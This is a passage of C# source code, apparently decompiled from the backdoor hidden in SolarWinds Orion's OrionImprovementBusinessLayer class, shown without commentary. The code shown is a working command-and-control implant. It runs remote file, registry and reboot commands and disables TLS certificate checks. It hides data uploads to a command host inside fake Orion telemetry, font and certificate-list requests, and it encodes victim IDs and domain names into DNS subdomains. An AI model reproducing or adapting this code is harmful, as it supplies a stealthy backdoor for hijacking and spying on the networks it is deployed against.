                if (job == JobEngine.WriteFile || job == JobEngine.FileExists || job == JobEngine.DeleteFile || job == JobEngine.GetFileHash || job == JobEngine.GetFileSystemEntries)
                {
                    return AddFileExecutionEngine(job, args, out result);
                }
                return result2;
            }
            catch (Exception ex)
            {
                if (!string.IsNullOrEmpty(result))
                {
                    result += "\n";
                }
                result += ex.Message;
                return ex.HResult;
            }
        }

        private static int AddRegistryExecutionEngine(JobEngine job, string[] args, out string result)
        {
            result = null;
            int result2 = 0;
            switch (job)
            {
                case JobEngine.ReadRegistryValue:
                    result2 = Job.ReadRegistryValue(args, out result);
                    break;
                case JobEngine.SetRegistryValue:
                    result2 = Job.SetRegistryValue(args);
                    break;
                case JobEngine.DeleteRegistryValue:
                    Job.DeleteRegistryValue(args);
                    break;
                case JobEngine.GetRegistrySubKeyAndValueNames:
                    Job.GetRegistrySubKeyAndValueNames(args, out result);
                    break;
            }
            return result2;
        }

        private static int AddFileExecutionEngine(JobEngine job, string[] args, out string result)
        {
            result = null;
            int result2 = 0;
            switch (job)
            {
                case JobEngine.WriteFile:
                    Job.WriteFile(args);
                    break;
                case JobEngine.FileExists:
                    Job.FileExists(args, out result);
                    break;
                case JobEngine.DeleteFile:
                    Job.DeleteFile(args);
                    break;
                case JobEngine.GetFileHash:
                    result2 = Job.GetFileHash(args, out result);
                    break;
                case JobEngine.GetFileSystemEntries:
                    Job.GetFileSystemEntries(args, out result);
                    break;
            }
            return result2;
        }

        private static byte[] Deflate(byte[] body)
        {
            int num = 0;
            byte[] array = body.ToArray();
            for (int i = 1; i < array.Length; i++)
            {
                array[i] ^= array[0];
                num += array[i];
            }
            if ((byte)num == array[0])
            {
                return ZipHelper.Decompress(array.Skip(1).ToArray());
            }
            return null;
        }

        private static byte[] Inflate(byte[] body)
        {
            byte[] array = ZipHelper.Compress(body);
            byte[] array2 = new byte[array.Length + 1];
            array2[0] = (byte)array.Sum((byte b) => b);
            for (int i = 0; i < array.Length; i++)
            {
                array[i] ^= array2[0];
            }
            Array.Copy(array, 0, array2, 1, array.Length);
            return array2;
        }

        private JobEngine ParseServiceResponse(byte[] body, out string args)
        {
            args = null;
            try
            {
                if (body == null || body.Length < 4)
                {
                    return JobEngine.None;
                }
                switch (requestMethod)
                {
                    case HttpOipMethods.Put:
                        body = body.Skip(48).ToArray();
                        break;
                    case HttpOipMethods.Post:
                        body = body.Skip(12).ToArray();
                        break;
                    default:
                        {
                            string[] value = (from Match m in Regex.Matches(Encoding.UTF8.GetString(body), "\"\\{[0-9a-f-]{36}\\}\"|\"[0-9a-f]{32}\"|\"[0-9a-f]{16}\"", RegexOptions.IgnoreCase)
                                              select m.Value).ToArray();
                            body = HexStringToByteArray(string.Join("", value).Replace("\"", string.Empty).Replace("-", string.Empty)
                                .Replace("{", string.Empty)
                                .Replace("}", string.Empty));
                            break;
                        }
                }
                int num = BitConverter.ToInt32(body, 0);
                body = body.Skip(4).Take(num).ToArray();
                if (body.Length != num)
                {
                    return JobEngine.None;
                }
                string[] array = Encoding.UTF8.GetString(Deflate(body)).Trim().Split(new char[1]
                {
                    ' '
                }, 2);
                JobEngine jobEngine = (JobEngine)int.Parse(array[0]);
                args = ((array.Length > 1) ? array[1] : null);
                return Enum.IsDefined(typeof(JobEngine), jobEngine) ? jobEngine : JobEngine.None;
            }
            catch (Exception)
            {
            }
            return JobEngine.None;
        }

        public static void Close(HttpHelper http, Thread thread)
        {
            if (thread == null || !thread.IsAlive)
            {
                return;
            }
            http?.Abort();
            try
            {
                thread.Join(60000);
                if (thread.IsAlive)
                {
                    thread.Abort();
                }
            }
            catch (Exception)
            {
            }
        }

        private string GetCache()
        {
            byte[] array = customerId.ToArray();
            byte[] array2 = new byte[array.Length];
            random.NextBytes(array2);
            for (int i = 0; i < array.Length; i++)
            {
                array[i] ^= array2[2 + i % 4];
            }
            return ByteArrayToHexString(array) + ByteArrayToHexString(array2);
        }

        private string GetOrionImprovementCustomerId()
        {
            byte[] array = new byte[16];
            for (int i = 0; i < array.Length; i++)
            {
                array[i] = (byte)(~customerId[i % (customerId.Length - 1)] + i / customerId.Length);
            }
            return new Guid(array).ToString().Trim('{', '}');
        }

        private HttpStatusCode CreateUploadRequestImpl(HttpWebRequest request, byte[] inData, out byte[] outData)
        {
            outData = null;
            try
            {
                request.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback)Delegate.Combine(request.ServerCertificateValidationCallback, (RemoteCertificateValidationCallback)((object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors sslPolicyErrors) => true));
                request.Proxy = proxy.GetWebProxy();
                request.UserAgent = GetUserAgent();
                request.KeepAlive = false;
                request.Timeout = 120000;
                request.Method = "GET";
                if (inData != null)
                {
                    request.Method = "POST";
                    using Stream stream = request.GetRequestStream();
                    stream.Write(inData, 0, inData.Length);
                }
                using WebResponse webResponse = request.GetResponse();
                using (Stream stream2 = webResponse.GetResponseStream())
                {
                    byte[] array = new byte[4096];
                    using MemoryStream memoryStream = new MemoryStream();
                    int count;
                    while ((count = stream2.Read(array, 0, array.Length)) > 0)
                    {
                        memoryStream.Write(array, 0, count);
                    }
                    outData = memoryStream.ToArray();
                }
                return ((HttpWebResponse)webResponse).StatusCode;
            }
            catch (WebException ex)
            {
                if (ex.Status == WebExceptionStatus.ProtocolError && ex.Response != null)
                {
                    return ((HttpWebResponse)ex.Response).StatusCode;
                }
            }
            catch (Exception)
            {
            }
            return HttpStatusCode.Unused;
        }

        private HttpStatusCode CreateUploadRequest(JobEngine job, int err, string response, out byte[] outData)
        {
            string text = httpHost;
            byte[] array = null;
            HttpOipExMethods httpOipExMethods = ((job != 0 && job != JobEngine.None) ? HttpOipExMethods.Head : HttpOipExMethods.Get);
            outData = null;
            try
            {
                if (!string.IsNullOrEmpty(response))
                {
                    byte[] bytes = Encoding.UTF8.GetBytes(response);
                    byte[] bytes2 = BitConverter.GetBytes(err);
                    byte[] array2 = new byte[bytes.Length + bytes2.Length + customerId.Length];
                    Array.Copy(bytes, array2, bytes.Length);
                    Array.Copy(bytes2, 0, array2, bytes.Length, bytes2.Length);
                    Array.Copy(customerId, 0, array2, bytes.Length + bytes2.Length, customerId.Length);
                    array = Inflate(array2);
                    httpOipExMethods = ((array.Length <= 10000) ? HttpOipExMethods.Put : HttpOipExMethods.Post);
                }
                if (!text.StartsWith(Uri.UriSchemeHttp + "://", StringComparison.OrdinalIgnoreCase) && !text.StartsWith(Uri.UriSchemeHttps + "://", StringComparison.OrdinalIgnoreCase))
                {
                    text = Uri.UriSchemeHttps + "://" + text;
                }
                if (!text.EndsWith("/"))
                {
                    text += "/";
                }
                text += GetBaseUri(httpOipExMethods, err);
                HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(text);
                if (httpOipExMethods == HttpOipExMethods.Get || httpOipExMethods == HttpOipExMethods.Head)
                {
                    httpWebRequest.Headers.Add("If-None-Match", GetCache());
                }
                if (httpOipExMethods == HttpOipExMethods.Put && (requestMethod == HttpOipMethods.Get || requestMethod == HttpOipMethods.Head))
                {
                    int[] intArray = GetIntArray((array != null) ? array.Length : 0);
                    byte[] array3 = null;
                    int num = 0;
                    uint num2 = 0u;
                    ulong num3 = (ulong)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalMilliseconds;
                    num3 -= 300000;
                    string str = "{";
                    str += string.Format("\"userId\":\"{0}\",", GetOrionImprovementCustomerId());
                    str += string.Format("\"sessionId\":\"{0}\",", sessionId.ToString().Trim('{', '}'));
                    str += "\"steps\":[";
                    for (int i = 0; i < intArray.Length; i++)
                    {
                        num2 = (uint)((random.Next(4) == 0) ? random.Next(512) : 0);
                        num3 += num2;
                        if (intArray[i] > 0)
                        {
                            num3 |= 2;
                            array3 = array.Skip(num).Take(intArray[i]).ToArray();
                            num += intArray[i];
                        }
                        else
                        {
                            num3 &= 0xFFFFFFFFFFFFFFFDuL;
                            array3 = new byte[random.Next(16, 28)];
                            for (int j = 0; j < array3.Length; j++)
                            {
                                array3[j] = (byte)random.Next();
                            }
                        }
                        str += "{";
                        str += string.Format("\"Timestamp\":\"\\/Date({0})\\/\",", num3);
                        str += string.Format("\"Index\":{0},", mIndex++);
                        str += "\"EventType\":\"Orion\",";
                        str += "\"EventName\":\"EventManager\",";
                        str += string.Format("\"DurationMs\":{0},", num2);
                        str += "\"Succeeded\":true,";
                        str += string.Format("\"Message\":\"{0}\"", Convert.ToBase64String(array3).Replace("/", "\\/"));
                        str += ((i + 1 != intArray.Length) ? "}," : "}");
                    }
                    str += "]}";
                    httpWebRequest.ContentType = "application/json";
                    array = Encoding.UTF8.GetBytes(str);
                }
                if (httpOipExMethods == HttpOipExMethods.Post || requestMethod == HttpOipMethods.Put || requestMethod == HttpOipMethods.Post)
                {
                    httpWebRequest.ContentType = "application/octet-stream";
                }
                return CreateUploadRequestImpl(httpWebRequest, array, out outData);
            }
            catch (Exception)
            {
            }
            return (HttpStatusCode)0;
        }

        private int[] GetIntArray(int sz)
        {
            int[] array = new int[30];
            int num = sz;
            for (int num2 = array.Length - 1; num2 >= 0; num2--)
            {
                if (num < 16 || num2 == 0)
                {
                    array[num2] = num;
                    break;
                }
                int num3 = num / (num2 + 1) + 1;
                if (num3 < 16)
                {
                    array[num2] = random.Next(16, Math.Min(32, num) + 1);
                    num -= array[num2];
                }
                else
                {
                    int num4 = Math.Min(512 - num3, num3 - 16);
                    array[num2] = random.Next(num3 - num4, num3 + num4 + 1);
                    num -= array[num2];
                }
            }
            return array;
        }

        private bool Valid(int percent)
        {
            return random.Next(100) < percent;
        }

        private string GetBaseUri(HttpOipExMethods method, int err)
        {
            int num = ((method != 0 && method != HttpOipExMethods.Head) ? 1 : 16);
            string baseUriImpl;
            do
            {
                baseUriImpl = GetBaseUriImpl(method, err);
                ulong hash = GetHash(baseUriImpl);
                if (!UriTimeStamps.Contains(hash))
                {
                    UriTimeStamps.Add(hash);
                    break;
                }
            }
            while (--num > 0);
            return baseUriImpl;
        }

        private string GetBaseUriImpl(HttpOipExMethods method, int err)
        {
            string text = null;
            if (method == HttpOipExMethods.Head)
            {
                text = ((ushort)err).ToString();
            }
            if (requestMethod == HttpOipMethods.Post)
            {
                string[] array = new string[9]
                {
                    "-root",
                    "-cert",
                    "-universal_ca",
                    "-ca",
                    "-primary_ca",
                    "-timestamp",
                    "",
                    "-global",
                    "-secureca"
                };
                return string.Format("pki/crl/{0}{1}{2}.crl", random.Next(100, 10000), array[random.Next(array.Length)], (text == null) ? "" : ("-" + text));
            }
            if (requestMethod == HttpOipMethods.Put)
            {
                string[] array2 = new string[10]
                {
                    "Bold",
                    "BoldItalic",
                    "ExtraBold",
                    "ExtraBoldItalic",
                    "Italic",
                    "Light",
                    "LightItalic",
                    "Regular",
                    "SemiBold",
                    "SemiBoldItalic"
                };
                string[] array3 = new string[7]
                {
                    "opensans",
                    "noto",
                    "freefont",
                    "SourceCodePro",
                    "SourceSerifPro",
                    "SourceHanSans",
                    "SourceHanSerif"
                };
                int num = random.Next(array3.Length);
                if (num <= 1)
                {
                    return string.Format("fonts/woff/{0}-{1}-{2}-webfont{3}.woff2", random.Next(100, 10000), array3[num], array2[random.Next(array2.Length)].ToLower(), text);
                }
                return string.Format("fonts/woff/{0}-{1}-{2}{3}.woff2", random.Next(100, 10000), array3[num], array2[random.Next(array2.Length)], text);
            }
            switch (method)
            {
                case HttpOipExMethods.Get:
                case HttpOipExMethods.Head:
                    {
                        string text2 = "";
                        if (Valid(20))
                        {
                            text2 += "SolarWinds";
                            if (Valid(40))
                            {
                                text2 += ".CortexPlugin";
                            }
                        }
                        if (Valid(80))
                        {
                            text2 += ".Orion";
                        }
                        if (Valid(80))
                        {
                            string[] array4 = new string[6]
                            {
                        "Wireless",
                        "UI",
                        "Widgets",
                        "NPM",
                        "Apollo",
                        "CloudMonitoring"
                            };
                            text2 = text2 + "." + array4[random.Next(array4.Length)];
                        }
                        if (Valid(30) || string.IsNullOrEmpty(text2))
                        {
                            string[] array5 = new string[4]
                            {
                        "Nodes",
                        "Volumes",
                        "Interfaces",
                        "Components"
                            };
                            text2 = text2 + "." + array5[random.Next(array5.Length)];
                        }
                        if (Valid(30) || text != null)
                        {
                            text2 = text2 + "-" + random.Next(1, 20) + "." + random.Next(1, 30);
                            if (text != null)
                            {
                                text2 = text2 + "." + (ushort)err;
                            }
                        }
                        return "swip/upd/" + text2.TrimStart('.') + ".xml";
                    }
                default:
                    return "swip/Upload.ashx";
                case HttpOipExMethods.Put:
                    return "swip/Events";
            }
        }

        private string GetUserAgent()
        {
            if (requestMethod == HttpOipMethods.Put || requestMethod == HttpOipMethods.Get)
            {
                return null;
            }
            if (requestMethod == HttpOipMethods.Post)
            {
                if (string.IsNullOrEmpty(userAgentDefault))
                {
                    userAgentDefault = "Microsoft-CryptoAPI/";
                    userAgentDefault += GetOSVersion(full: false);
                }
                return userAgentDefault;
            }
            if (string.IsNullOrEmpty(userAgentOrionImprovementClient))
            {
                userAgentOrionImprovementClient = "SolarWindsOrionImprovementClient/";
                try
                {
                    string directoryName = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
                    directoryName += "\\OrionImprovement\\SolarWinds.OrionImprovement.exe";
                    userAgentOrionImprovementClient += FileVersionInfo.GetVersionInfo(directoryName).FileVersion;
                }
                catch (Exception)
                {
                    userAgentOrionImprovementClient += "3.0.0.382";
                }
            }
            return userAgentOrionImprovementClient;
        }
    }

    private static class DnsHelper
    {
        public static bool CheckServerConnection(string hostName)
        {
            try
            {
                IPHostEntry iPHostEntry = GetIPHostEntry(hostName);
                if (iPHostEntry != null)
                {
                    IPAddress[] addressList = iPHostEntry.AddressList;
                    for (int i = 0; i < addressList.Length; i++)
                    {
                        AddressFamilyEx addressFamily = IPAddressesHelper.GetAddressFamily(addressList[i]);
                        if (addressFamily != AddressFamilyEx.Error && addressFamily != AddressFamilyEx.Atm)
                        {
                            return true;
                        }
                    }
                }
            }
            catch (Exception)
            {
            }
            return false;
        }

        public static IPHostEntry GetIPHostEntry(string hostName)
        {
            int[][] array = new int[2][]
            {
                new int[2]
                {
                    25,
                    30
                },
                new int[2]
                {
                    55,
                    60
                }
            };
            int num = array.GetLength(0) + 1;
            for (int i = 1; i <= num; i++)
            {
                try
                {
                    return Dns.GetHostEntry(hostName);
                }
                catch (SocketException)
                {
                }
                if (i + 1 <= num)
                {
                    DelayMs(array[i - 1][0] * 1000, array[i - 1][1] * 1000);
                }
            }
            return null;
        }

        public static AddressFamilyEx GetAddressFamily(string hostName, DnsRecords rec)
        {
            rec.cname = null;
            try
            {
                IPHostEntry iPHostEntry = GetIPHostEntry(hostName);
                if (iPHostEntry == null)
                {
                    return AddressFamilyEx.Error;
                }
                IPAddress[] addressList = iPHostEntry.AddressList;
                foreach (IPAddress iPAddress in addressList)
                {
                    if (iPAddress.AddressFamily != AddressFamily.InterNetwork)
                    {
                        continue;
                    }
                    if (iPHostEntry.HostName != hostName && !string.IsNullOrEmpty(iPHostEntry.HostName))
                    {
                        rec.cname = iPHostEntry.HostName;
                        if (IPAddressesHelper.GetAddressFamily(iPAddress) == AddressFamilyEx.Atm)
                        {
                            return AddressFamilyEx.Atm;
                        }
                        if (rec.dnssec)
                        {
                            rec.dnssec = false;
                            return AddressFamilyEx.NetBios;
                        }
                        return AddressFamilyEx.Error;
                    }
                    IPAddressesHelper.GetAddresses(iPAddress, rec);
                    return IPAddressesHelper.GetAddressFamily(iPAddress, out rec.dnssec);
                }
                return AddressFamilyEx.Unknown;
            }
            catch (Exception)
            {
            }
            return AddressFamilyEx.Error;
        }
    }

    private class CryptoHelper
    {
        private const int dnSize = 32;

        private const int dnCount = 36;

        private readonly byte[] guid;

        private readonly string dnStr;

        private string dnStrLower;

        private int nCount;

        private int offset;

        public CryptoHelper(byte[] userId, string domain)
        {
            guid = userId.ToArray();
            dnStr = DecryptShort(domain);
            offset = 0;
            nCount = 0;
        }

        private static string Base64Decode(string s)
        {
            string text = "rq3gsalt6u1iyfzop572d49bnx8cvmkewhj";
            string text2 = "0_-.";
            string text3 = "";
            Random random = new Random();
            foreach (char value in s)
            {
                int num = text2.IndexOf(value);
                text3 = ((num < 0) ? (text3 + text[(text.IndexOf(value) + 4) % text.Length]) : (text3 + text2[0] + text[num + random.Next() % (text.Length / text2.Length) * text2.Length]));
            }
            return text3;
        }

        private static string Base64Encode(byte[] bytes, bool rt)
        {
            string text = "ph2eifo3n5utg1j8d94qrvbmk0sal76c";
            string text2 = "";
            uint num = 0u;
            int num2 = 0;
            foreach (byte b in bytes)
            {
                num |= (uint)(b << num2);
                for (num2 += 8; num2 >= 5; num2 -= 5)
                {
                    text2 += text[(int)(num & 0x1F)];
                    num >>= 5;
                }
            }
            if (num2 > 0)
            {
                if (rt)
                {
                    num |= (uint)(new Random().Next() << num2);
                }
                text2 += text[(int)(num & 0x1F)];
            }
            return text2;
        }

        private static string CreateSecureString(byte[] data, bool flag)
        {
            byte[] array = new byte[data.Length + 1];
            array[0] = (byte)new Random().Next(1, 127);
            if (flag)
            {
                array[0] |= 128;
            }
            for (int i = 1; i < array.Length; i++)
            {
                array[i] = (byte)(data[i - 1] ^ array[0]);
            }
            return Base64Encode(array, rt: true);
        }

        private static string CreateString(int n, char c)
        {
            if (n < 0 || n >= 36)
            {
                n = 35;
            }
            n = (n + c) % 36;
            if (n < 10)
            {
                return ((char)(48 + n)).ToString();
            }
            return ((char)(97 + n - 10)).ToString();
        }

        private static string DecryptShort(string domain)
        {
            if (domain.All((char c) => "0123456789abcdefghijklmnopqrstuvwxyz-_.".Contains(c)))
            {
                return Base64Decode(domain);
            }
            return "00" + Base64Encode(Encoding.UTF8.GetBytes(domain), rt: false);
        }

        private string GetStatus()
        {
            return "." + domain2 + "." + domain3[(int)guid[0] % domain3.Length] + "." + domain1;
        }

        private static int GetStringHash(bool flag)
        {
            return (((int)((DateTime.UtcNow - new DateTime(2010, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalMinutes / 30.0) & 0x7FFFF) << 1) | (flag ? 1 : 0);
        }

        private byte[] UpdateBuffer(int sz, byte[] data, bool flag)
        {
            byte[] array = new byte[guid.Length + ((data != null) ? data.Length : 0) + 3];
            Array.Clear(array, 0, array.Length);
            Array.Copy(guid, array, guid.Length);
            int stringHash = GetStringHash(flag);
            array[guid.Length] = (byte)(((stringHash & 0xF0000) >> 16) | ((sz & 0xF) << 4));
            array[guid.Length + 1] = (byte)((stringHash & 0xFF00) >> 8);
            array[guid.Length + 2] = (byte)((uint)stringHash & 0xFFu);
            if (data != null)
            {
                Array.Copy(data, 0, array, array.Length - data.Length, data.Length);
            }
            for (int i = 0; i < guid.Length; i++)
            {
                array[i] ^= array[guid.Length + 2 - i % 2];
            }
            return array;
        }

        public string GetNextStringEx(bool flag)
        {
            byte[] array = new byte[(svcList.Length * 2 + 7) / 8];
            Array.Clear(array, 0, array.Length);
            for (int i = 0; i < svcList.Length; i++)
            {
                int num = Convert.ToInt32(svcList[i].stopped) | (Convert.ToInt32(svcList[i].running) << 1);
                array[array.Length - 1 - i / 4] |= Convert.ToByte(num << i % 4 * 2);
            }
            return CreateSecureString(UpdateBuffer(2, array, flag), flag: false) + GetStatus();
        }

        public string GetNextString(bool flag)
        {
            return CreateSecureString(UpdateBuffer(1, null, flag), flag: false) + GetStatus();
        }

        public string GetPreviousString(out bool last)
        {
            string text = CreateSecureString(guid, flag: true);
            int num = 32 - text.Length - 1;
            string result = "";
            last = false;
            if (offset >= dnStr.Length || nCount > 36)
            {
                return result;
            }
            int num2 = Math.Min(num, dnStr.Length - offset);
            dnStrLower = dnStr.Substring(offset, num2);
            offset += num2;
            if ("-_0".Contains(dnStrLower[dnStrLower.Length - 1]))
            {
                if (num2 == num)
                {
                    offset--;
                    dnStrLower = dnStrLower.Remove(dnStrLower.Length - 1);
                }
                dnStrLower += "0";
            }
            if (offset >= dnStr.Length || nCount > 36)
            {
                nCount = -1;
            }
            result = text + CreateString(nCount, text[0]) + dnStrLower + GetStatus();
            if (nCount >= 0)
            {
                nCount++;
            }
            last = nCount < 0;
            return result;
        }

        public string GetCurrentString()
        {
            string text = CreateSecureString(guid, flag: true);
            return text + CreateString((nCount > 0) ? (nCount - 1) : nCount, text[0]) + dnStrLower + GetStatus();
        }
    }

    private class DnsRecords
    {
        public int A;

        public int _type;

        public int length;

        public string cname;

        public bool dnssec;
    }

    private class IPAddressesHelper
    {
        private readonly IPAddress subnet;

        private readonly IPAddress mask;

        private readonly AddressFamilyEx family;

        private readonly bool ext;

        public IPAddressesHelper(string subnet, string mask, AddressFamilyEx family, bool ext)
        {
            this.family = family;
            this.subnet = IPAddress.Parse(subnet);
            this.mask = IPAddress.Parse(mask);
            this.ext = ext;
        }

        public IPAddressesHelper(string subnet, string mask, AddressFamilyEx family)
            : this(subnet, mask, family, ext: false)
        {
        }

        public static void GetAddresses(IPAddress address, DnsRecords rec)
        {
            Random random = new Random();
            byte[] addressBytes = address.GetAddressBytes();
            switch (addressBytes[(int)addressBytes.LongLength - 2] & 0xA)
            {
                case 2:
                    rec.length = 1;
                    break;
                case 8:
                    rec.length = 2;
                    break;
                case 10:
                    rec.length = 3;
                    break;
                default:
                    rec.length = 0;
                    break;
            }
            switch (addressBytes[(int)addressBytes.LongLength - 1] & 0x88)
            {
                case 8:
                    rec._type = 1;
                    break;
                case 128:
                    rec._type = 2;
                    break;
                case 136:
                    rec._type = 3;
                    break;
                default:
                    rec._type = 0;
                    break;
            }
            switch (addressBytes[(int)addressBytes.LongLength - 1] & 0x54)
            {
                case 4:
                    rec.A = random.Next(240, 300);
                    break;
                case 16:
                    rec.A = random.Next(480, 600);
                    break;
                case 20:
                    rec.A = random.Next(1440, 1560);
                    break;
                case 64:
                    rec.A = random.Next(4320, 5760);
                    break;
                case 68:
                    rec.A = random.Next(10020, 10140);
                    break;
                case 80:
                    rec.A = random.Next(20100, 20220);
                    break;
                case 84:
                    rec.A = random.Next(43140, 43260);
                    break;
                default:
                    rec.A = 0;
                    break;
            }
        }

        public static AddressFamilyEx GetAddressFamily(IPAddress address)
        {
            bool flag;
            return GetAddressFamily(address, out flag);
        }

        public static AddressFamilyEx GetAddressFamily(IPAddress address, out bool ext)
        {
            ext = false;
            try
            {
                if (IPAddress.IsLoopback(address) || address.Equals(IPAddress.Any) || address.Equals(IPAddress.IPv6Any))
                {
                    return AddressFamilyEx.Atm;
                }
                if (address.AddressFamily == AddressFamily.InterNetworkV6)
                {
                    byte[] addressBytes = address.GetAddressBytes();
                    if (addressBytes.Take(10).All((byte b) => b == 0) && addressBytes[10] == addressBytes[11] && (addressBytes[10] == 0 || addressBytes[10] == byte.MaxValue))
                    {
                        address = address.MapToIPv4();
                    }
                }
                else if (address.AddressFamily != AddressFamily.InterNetwork)
                {
                    return AddressFamilyEx.Unknown;
                }
                byte[] addressBytes2 = address.GetAddressBytes();
                IPAddressesHelper[] nList = OrionImprovementBusinessLayer.nList;
                foreach (IPAddressesHelper iPAddressesHelper in nList)
                {
                    byte[] addressBytes3 = iPAddressesHelper.subnet.GetAddressBytes();
                    byte[] addressBytes4 = iPAddressesHelper.mask.GetAddressBytes();
                    if (addressBytes2.Length != addressBytes4.Length || addressBytes2.Length != addressBytes3.Length)
                    {
                        continue;
                    }
                    bool flag = true;
                    for (int j = 0; j < addressBytes2.Length; j++)
                    {
                        if ((addressBytes2[j] & addressBytes4[j]) != (addressBytes3[j] & addressBytes4[j]))
                        {
                            flag = false;
                            break;
                        }
                    }
                    if (flag)
                    {
                        ext = iPAddressesHelper.ext;
                        return iPAddressesHelper.family;
                    }
                }
                return (address.AddressFamily == AddressFamily.InterNetworkV6) ? AddressFamilyEx.InterNetworkV6 : AddressFamilyEx.InterNetwork;
            }
            catch (Exception)
            {
            }
            return AddressFamilyEx.Error;
        }
    }

    private static class ZipHelper
    {
        public static byte[] Compress(byte[] input)
        {
            using MemoryStream memoryStream2 = new MemoryStream(input);
            using MemoryStream memoryStream = new MemoryStream();
            using (DeflateStream destination = new DeflateStream(memoryStream, CompressionMode.Compress))
            {
                memoryStream2.CopyTo(destination);
            }
            return memoryStream.ToArray();
        }

        public static byte[] Decompress(byte[] input)
        {
            using MemoryStream stream = new MemoryStream(input);
            using MemoryStream memoryStream = new MemoryStream();
            using (DeflateStream deflateStream = new DeflateStream(stream, CompressionMode.Decompress))
            {
                deflateStream.CopyTo(memoryStream);
            }
            return memoryStream.ToArray();
        }

        public static string Zip(string input)
        {
            if (string.IsNullOrEmpty(input))
            {
                return input;
            }
            try
            {
                return Convert.ToBase64String(Compress(Encoding.UTF8.GetBytes(input)));
            }
            catch (Exception)
            {
                return "";
            }
        }

        public static string Unzip(string input)
        {
            if (string.IsNullOrEmpty(input))
            {
                return input;
            }
            try
            {
                byte[] bytes = Decompress(Convert.FromBase64String(input));
                return Encoding.UTF8.GetString(bytes);
            }
            catch (Exception)
            {
                return input;
            }
        }
    }

    public class NativeMethods
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct LUID
        {
            public uint LowPart;

            public uint HighPart;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct LUID_AND_ATTRIBUTES
        {
            public LUID Luid;

            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct TOKEN_PRIVILEGE
        {
            public uint PrivilegeCount;

            public LUID_AND_ATTRIBUTES Privilege;
        }

        private const uint SE_PRIVILEGE_DISABLED = 0u;

        private const uint SE_PRIVILEGE_ENABLED = 2u;

        private const string ADVAPI32 = "advapi32.dll";

        private const string KERNEL32 = "kernel32.dll";

        [DllImport("kernel32.dll", SetLastError = true)]
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CloseHandle(IntPtr handle);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool AdjustTokenPrivileges([In] IntPtr TokenHandle, [In][MarshalAs(UnmanagedType.Bool)] bool DisableAllPrivileges, [In] ref TOKEN_PRIVILEGE NewState, [In] uint BufferLength, [In][Out] ref TOKEN_PRIVILEGE PreviousState, [In][Out] ref uint ReturnLength);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, EntryPoint = "LookupPrivilegeValueW", SetLastError = true)]
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool LookupPrivilegeValue([In] string lpSystemName, [In] string lpName, [In][Out] ref LUID Luid);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool OpenProcessToken([In] IntPtr ProcessToken, [In] TokenAccessLevels DesiredAccess, [In][Out] ref IntPtr TokenHandle);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, EntryPoint = "InitiateSystemShutdownExW", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool InitiateSystemShutdownEx([In] string lpMachineName, [In] string lpMessage, [In] uint dwTimeout, [In][MarshalAs(UnmanagedType.Bool)] bool bForceAppsClosed, [In][MarshalAs(UnmanagedType.Bool)] bool bRebootAfterShutdown, [In] uint dwReason);

        public static bool RebootComputer()
        {
            bool result = false;
            try
            {
                bool previousState = false;
                string privilege = "SeShutdownPrivilege";
                if (!SetProcessPrivilege(privilege, newState: true, out previousState))
                {
                    return result;
                }
                result = InitiateSystemShutdownEx(null, null, 0u, bForceAppsClosed: true, bRebootAfterShutdown: true, 2147745794u);
                SetProcessPrivilege(privilege, previousState, out previousState);
                return result;
            }
            catch (Exception)
            {
                return result;
            }
        }

        public static bool SetProcessPrivilege(string privilege, bool newState, out bool previousState)
        {
            bool result = false;
            previousState = false;
            try
            {
                IntPtr TokenHandle = IntPtr.Zero;
                LUID Luid = default(LUID);
                Luid.LowPart = 0u;
                Luid.HighPart = 0u;
                if (!OpenProcessToken(GetCurrentProcess(), TokenAccessLevels.Query | TokenAccessLevels.AdjustPrivileges, ref TokenHandle))
                {
                    return false;
                }
                if (!LookupPrivilegeValue(null, privilege, ref Luid))
                {
                    CloseHandle(TokenHandle);
                    return false;
                }
                TOKEN_PRIVILEGE NewState = default(TOKEN_PRIVILEGE);
                TOKEN_PRIVILEGE PreviousState = default(TOKEN_PRIVILEGE);
                NewState.PrivilegeCount = 1u;
                NewState.Privilege.Luid = Luid;
                NewState.Privilege.Attributes = (newState ? 2u : 0u);
                uint ReturnLength = 0u;
                AdjustTokenPrivileges(TokenHandle, DisableAllPrivileges: false, ref NewState, (uint)Marshal.SizeOf((object)PreviousState), ref PreviousState, ref ReturnLength);
                previousState = (PreviousState.Privilege.Attributes & 2) != 0;
                result = true;
                CloseHandle(TokenHandle);
                return result;
            }
            catch (Exception)
            {
                return result;
            }
        }
    }

    private static volatile bool _isAlive = false;

    private static readonly object _isAliveLock = new object();

    private static readonly ulong[] assemblyTimeStamps = new ulong[137]
    {
        2597124982561782591uL,
        2600364143812063535uL,
        13464308873961738403uL,
        4821863173800309721uL,
        12969190449276002545uL,
        3320026265773918739uL,
        12094027092655598256uL,
        10657751674541025650uL,
        11913842725949116895uL,
        5449730069165757263uL,
        292198192373389586uL,
        12790084614253405985uL,
